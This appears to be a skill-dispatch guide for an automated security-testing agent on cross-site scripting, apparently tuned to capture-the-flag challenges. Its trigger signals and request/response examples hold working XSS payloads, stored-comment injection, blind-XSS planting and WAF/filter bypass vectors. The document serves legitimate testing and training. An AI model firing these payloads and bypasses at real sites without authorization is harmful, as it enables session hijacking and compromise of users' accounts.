# xss — when to use

Cross-Site Scripting: the app takes a value from your request and writes it back into the HTML
of a page (or a client-side script writes it into the DOM) without neutralising it, so a string
you supply lands inside the markup the browser parses. The core tell is almost always a value you
sent reappearing un-encoded in the next HTML response. Fire on the *reflection shape* — a value
you control echoed verbatim — not on a confirmed `alert`; register the reflection as a finding and
dispatch promptly rather than looking harder for a louder signal.

## Trigger signals (dispatch this skill the moment you observe…)

- **A value you sent comes back verbatim in the response body.** Send a unique nonce (e.g. `zqx9117`)
  in any parameter; if it is echoed unescaped (not as `&lt;`/`&gt;`/`&amp;` and not URL-encoded) → reflected
  XSS candidate. A `?name=` echoed into a `<form>`, a search term printed back, a "your input was: …" box.
- **Marker characters survive untransformed.** Probe with a benign canary like `'"<>(){}`; if `<`, `>`,
  `"`, or `'` come back as literal bytes rather than entity-encoded → the sink is not escaping.
- **A reflected value inside a double-quoted HTML attribute.** `GET /page?name=ReconName` →
  `<input type=text name=name … value="ReconName">`. Your input is the *attribute value*; break out with `"`
  and add an event handler (`" autofocus onfocus=alert('XSS') x="`). Attribute-context reflection is just as
  much an XSS tell as a body-context one.
- **The reflection sits inside a `<script>` block, an inline event handler, a `style=`, an `href`/`src`,
  or an SVG/`<svg>` region.** Any reflection at all routes here; the *context* it lands in only decides which
  payload, not whether to dispatch.
- **Input is stored and re-rendered.** Anything that takes user text and shows it back later to you or to
  someone else — comments, usernames/display names, profile bios, chat/message bodies, support tickets,
  reviews, filenames in a listing, audit/log viewers, "your last search was…". Dispatch when you can write
  text in one place and see it rendered in another.
- **Client-side templating or framework markers in the page.** React/Vue/Angular/Svelte, a build bundle,
  `data-reactroot`, `ng-`/`v-` attributes, or hydration JSON → look for `dangerouslySetInnerHTML`, `v-html`,
  `$sce.trustAsHtml`, `{@html}`, `innerHTML`, `document.write`, `eval`. DOM-XSS lives here even when the
  server response looks clean.
- **The URL fragment/hash or query string is read by client JS and written into the page.** If
  `location.hash`/`location.search` content appears in the DOM after load (and not in the raw server
  response) → DOM-based XSS.
- **`Content-Type: text/html` (or `image/svg+xml`) returned for content you control** — an upload served
  inline, an error page echoing the bad input, a redirect page printing the target URL.
- **Error/search/404 pages that print back your input.** "No results for *<your text>*", "Invalid value:
  *<your text>*", "Page *<your path>* not found" are classic reflected sinks. Also: error pages echoing a
  parameter, comment/message fields, `User-Agent`/`Referer` echoed into an admin log viewer, URL path
  segments printed in a "page not found: <path>" message.
- **A server-side response that *changes state* when your input contains HTML.** Benign input keeps an error
  image / "Failed! Try again!"; an input the grader recognises as a tag flips the page to a "start" image /
  "Let the game begin. Good Luck". A behavioural change driven purely by whether your value parses as markup
  is a reflection-into-HTML signal.
- **A tag/keyword blacklist message printed in the response.** `'>Sorry, you can't use that tag` or
  `Sorry you can't use: 'alert'`. The server is filtering your HTML — it would not bother unless your input
  reached an HTML sink. A filter message is a positive XSS tell, not a dead end (bypass with case-variation,
  alternate tags, or encoded handlers).
- **A grader/checker hints at a specific value.** "You alerted 1 instead of XSS", "Oops! You did an alert
  with X instead of \"XSS\"", or a named expected token → the XSS oracle is telling you the exact value the
  payload must produce; tune the payload to emit that token.
- **A blind/asynchronous surface an operator or headless checker will view later.** Admin-only notes, ticket
  queues, log dashboards, push-notification bodies — submit data you cannot see rendered, plant a blind-XSS
  callback payload.
- **An `X-XSS-Protection: 0` response header on the reflecting route.** The app explicitly disables the
  browser's XSS auditor — a strong hint the route is the intended XSS sink.
- **A bare HTML form whose only input is echoed back.** A thin "type something, see it rendered" page with
  no auth, no DB, no other function is an XSS challenge by construction.
- **A reflected value the server does NOT evaluate.** `{{7*7}}` coming back as the literal `{{7*7}}` (not
  `49`) rules out SSTI and confirms the surface is a plain reflection sink → xss, not ssti.

## Use-case scenarios

- **Reflected-XSS sweep on every input.** Whenever you have GET/POST parameters, path segments, headers
  (Referer, User-Agent, X-Forwarded-For), or cookies that show up in HTML, systematically probe each,
  classify the reflection context, and craft a payload that fires in that exact context. The right move on
  any form, search box, filter, sort, pagination, or tracking parameter.
- **Body-context reflection (break straight into markup).** Input reflects *after* the closing `>` of the
  input tag: `…placeholder="Enter your name..." > YOUR_INPUT>`. You are already in HTML body context, so a
  raw `<script>…</script>`, `<img src=x onerror=…>`, `<svg onload=…>`, or `<body onpageshow=…>` is parsed
  directly.
- **Attribute-context reflection (escape the quotes first).** Input reflects *inside* `value="YOUR_INPUT"`.
  A raw `<script>` does nothing — it is trapped as an attribute value. Close the attribute and tag, or stay
  in the tag and add an inline handler: `" autofocus onfocus=alert(...) x="`. Knowing *which* context you
  are in (the difference between `> X>` and `value="X">`) decides the payload — read the reflection
  carefully before firing.
- **Stored XSS on persistence surfaces.** Multi-user apps where one user's input renders in another user's
  browser — the high-impact case. Comments, forums, messaging, profile fields, organization/team names,
  file/asset names, calendar event titles, anything an admin reviews. Inject-then-revisit and check
  execution on render.
- **DOM-based XSS in JS-heavy SPAs.** When the server returns a near-empty shell and JavaScript builds the
  page, server-side grepping finds nothing. Read the JS for source→sink flows (`location.*`, `postMessage`,
  `document.referrer`, storage → `innerHTML`/`eval`/`document.write`) and prove execution via DOM evidence
  rather than response reflection.
- **Filter / sanitizer / WAF bypass.** When `<script>` is stripped but you still see partial reflection,
  rotate through event-handler vectors (`onerror`, `onload`, `onfocus`, `ontoggle`), SVG/MathML active
  content, casing (`<ScRiPt>`), alternate event tags (`<svg onload>`/`<details ontoggle>`/`<body onpageshow>`),
  HTML-entity-encoded handler bodies (`onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)"`), encoding, double-encoding,
  nested-tag stripping, split identifiers, computed function references (`top["al"+"ert"]`,
  `window["al"+"ert"]`), and tagged-template/parentheses bypasses. Know which handlers auto-fire (needed for
  headless/blind checkers where nobody clicks). The filter message tells you you are in the right place — the
  job is bypass, not detection.
- **Exact-argument graders.** The win condition may not be "an alert fires" but "the alert argument is the
  exact string `XSS`." `alert(1)` returns `Oops! You did an alert with 1 instead of "XSS"`. `alert("XSS")`
  may be blocked if the literal `XSS` string is filtered — pass with `String.fromCharCode(88,83,83)`,
  `/XSS/.source`, or `prompt("XSS")`. When you see "instead of \"XSS\"", you have the sink and just need the
  argument exactly right — stay on xss, do not re-route.
- **CSP / Trusted Types assessment.** When a `Content-Security-Policy` header is present, evaluate whether it
  is actually protective (nonces/hashes/`strict-dynamic`) or bypassable (wildcards, `unsafe-inline`,
  allow-listed JSONP/script-gadget origins, user-controlled CSP). A reflection under a weak CSP is still
  exploitable; under a strict one it may be a false positive — validate execution, don't report on reflection.
- **Active-content uploads and rich text.** SVG/HTML file uploads served inline, Markdown/WYSIWYG renderers
  that pass raw HTML through, PDF/email renderers. Dispatch when you can upload or author content the server
  later serves with an executable content type.
- **Non-obvious channels.** `postMessage` handlers, WebSocket/SSE message rendering, prototype-pollution
  merges that turn later DOM writes into script execution, mobile WebView bridges. Use whenever
  user-influenced data reaches a rendering or scripting sink across any of these channels.

## Concrete tells (request → response examples)

- **Plain reflected, unencoded (body context):**
  Request: `GET /search?q=zqx<b>9117</b>` → Response: `Results for zqx<b>9117</b>` (the `<b>` rendered as a
  tag, not `&lt;b&gt;`). Or `GET /page?name=ReconUser` → `…placeholder="Enter your name..." > ReconUser>`
  (literal echo after the `>`). Confirm with `GET /search?q=<svg onload=alert(1)>`.
- **Reflected inside a quoted attribute:**
  Request: `GET /page?ref="zqx9117` → Response: `<input value=""zqx9117">` (your `"` broke out). Or
  `GET /page?name=ReconName` → `<input … value="ReconName">`. Payload: `" autofocus onfocus=alert(1) x="`.
- **Reflected inside a JS string:**
  Request: `GET /p?u=zqx9117` → Response: `<script>var u="zqx9117";</script>` and your `"`/backslash survive.
  Payload: `"-alert(1)-"` or `</script><svg onload=alert(1)>`.
- **Encoded (NOT this skill):**
  Request: `GET /search?q=<b>` → Response: `Results for &lt;b&gt;` → safely HTML-encoded; not exploitable
  here. Re-check other contexts before discarding.
- **DOM-based (server clean, JS dirty):**
  Request: `GET /#name=zqx9117` — raw HTML response does NOT contain `zqx9117`, but after JS runs the rendered
  DOM shows it inside an element written via `innerHTML`. Payload: `#name=<img src=x onerror=alert(1)>`.
- **Stored:**
  Request 1: `POST /comment` body `comment=<img src=x onerror=alert(1)>` → Request 2: `GET /thread/123` later
  returns that `<img …onerror…>` inline. Confirm execution on load.
- **Tag blacklist fires:**
  Request: `GET /page?name=<script>alert(1)</script>` → Response: `'>Sorry, you can't use that tag` — server
  filters HTML tags, proving the input reaches an HTML sink (switch tags/encodings). Or under a WAF,
  `<script>alert(1)</script>` is blocked/`403`/stripped but `<svg/onload=alert(1)//` or `<img src=x onerror=alert(1)>`
  reflects intact → filter bypassable, keep rotating vectors.
- **`{{7*7}}` NOT evaluated → XSS, not SSTI:**
  Request: `GET /page?name={{7*7}}` → Response: `… value="{{7*7}}">` / `… > {{7*7}}>` — the literal `{{7*7}}`
  reflected, never `49`. Reflection without evaluation = xss.
- **Grader state change confirms a recognised payload:**
  Request: `GET /page?name=<script>alert(1)</script>` → response flips from `error_triangle.png` / "Failed!
  Try again!" to `new_triangle.png` / "Let the game begin. Good Luck" — behavioural change driven by whether
  the input parses as a tag.
- **Wrong-argument / checker-graded oracle:**
  Request: `GET /page?name=<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;(1)">` (alert with `1`) →
  Response: `Oops! You did an alert with 1 instead of "XSS"` — sink confirmed, argument wrong; just need
  `alert('XSS')`. (Generally: response says "Failed — expected XSS, got 1" → switch to
  `alert('XSS')`/`alert(document.domain)` to emit the demanded token.)
- **Win, body context:**
  `GET /page?name=<svg onload=window["al"+"ert"](String.fromCharCode(88,83,83))>` → `success_circle.png` +
  `Congratulations! Here is the flag: FLAG{…}`. With event-handler tag (parameter `solution`):
  `GET /page?name=solution&solution=<body onpageshow=alert("XSS")>` → `success_star.png` + flag.
- **Win, attribute context:**
  `GET /page?name=" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="` → `Congratulations! Here is
  the flag: FLAG{…}` (the char-code form passes where `alert("XSS")` is rejected because the literal `XSS`
  string is filtered).

## When NOT to use it / easily-confused-with

- **A reflected value that is *evaluated*, not just rendered, is SSTI — not XSS.** If `{{7*7}}` returns `49`,
  or `${7*7}`/`<%= 7*7 %>` resolves, the server executed a template expression → route to SSTI. XSS is when
  markup/JS is parsed by a *browser*, not arithmetic resolved by the server; literal `{{7*7}}` reflection is
  the discriminator.
- **A reflected value that triggers a `500`/SQL error is SQLi, not XSS.** A quote causing a database error is
  injection into a query, not into HTML. A reflected value that triggers a backend syscall/process is command
  injection (`;id` runs a shell). XSS reflections come back `200` with your string intact in the markup.
- **A user-controlled URL the *server* fetches is SSRF, not XSS.** One the *browser* navigates to / executes
  (`javascript:`, `data:text/html`) is in scope here; one the server requests on your behalf, or a plain
  `Location:` redirect, is not.
- **Open redirect is not XSS** unless the redirect target is a scriptable scheme. `Location: //evil.com` is an
  open redirect; `Location: javascript:alert(1)` or a `<meta>`/JS redirect into a `javascript:` URL crosses
  into XSS.
- **A filter message ("Sorry, you can't use that tag") is a bypass problem, still xss — do not abandon the
  lane.** A blacklist proves the HTML sink exists; the correct response is an encoding/alternate-tag bypass.
- **Safely encoded reflections are false positives.** If `< > " '` all come back entity-encoded *for the exact
  context they land in*, there is no XSS — dispatch on reflection that survives unescaped, not on mere
  reflection. The double-encoded `%253Csvg…` case staying inert is a sink that is encoded; keep probing other
  contexts/parameters rather than declaring a win.
- **Header injection / CRLF (response splitting)** can look adjacent (input lands in headers) but is its own
  class; only treat as XSS if you can land executable HTML in a body the browser parses.
- **CSP/Trusted-Types-protected reflections:** a payload that visibly reflects but is blocked at runtime by a
  strict CSP (nonce/hash, no `unsafe-inline`) is not a confirmed finding without a concrete bypass — keep this
  skill, but validate execution.
- **Don't route here for data only ever shown as plain text / inside `<textarea>` with proper encoding, or
  rendered by a strict sanitizer (DOMPurify default, framework auto-escaping with no
  `dangerouslySetInnerHTML`/`v-html`/`{@html}`).** Those are designed-safe paths; only return when a raw-HTML
  pass-through or trust-bypass API is in play.
